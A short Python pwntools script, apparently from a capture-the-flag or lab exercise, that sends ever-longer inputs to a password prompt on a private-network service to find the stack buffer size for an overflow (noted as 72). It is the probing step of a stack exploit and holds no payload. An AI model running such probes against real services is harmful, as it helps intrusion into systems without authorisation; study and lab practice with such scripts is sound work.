from pwn import*

def getsize():
    i = 1
    while 1:
        try:
            p = remote('192.168.10.185',4444)
            p.recvuntil("WelCome my friend,Do you know password?\n")
            p.send(i*'a')
            data = p.recv()
            if not data.startswith('No password'):
                return i-1
            else:
                i+=1
        except EOFError:
            p.close()
            return i-1

size = getsize()
print "size is [%s]"%size

#stack size -->[72]
